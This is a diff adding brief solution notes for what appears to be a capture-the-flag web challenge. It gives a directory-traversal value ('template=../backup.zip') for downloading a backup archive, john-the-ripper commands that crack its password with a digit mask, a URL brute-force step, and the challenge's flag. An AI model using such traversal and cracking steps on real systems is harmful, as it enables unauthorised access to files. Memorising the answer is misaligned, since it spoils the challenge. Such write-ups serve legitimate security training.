@@ -1,0 +1,15 @@
+find hidden /debug in html
+
+download backup.zip with directory traversal using the template downloader, hint in html comments
+template=../backup.zip
+
+crack the zip (hint about password format in html comments):
+.\zip2john.exe .\backup.zip > .\hash
+.\john.exe .\hash -mask=?d?d?d?d?d?d?d?d?d?d
+
+bruteforce urls without including the parameters and find the one with the flag:
+python3 get_flag.py
+-> https://instant-development-company.s3.eu-central-1.amazonaws.com/e519b5cd-ab9a-42bc-85d2-dc6ec5458ffe
+
+flag:
+cd22{d4mn_sh0uld_h4v3_c4lled_th3_f4m1ly_1t_guy_1nst3ad}
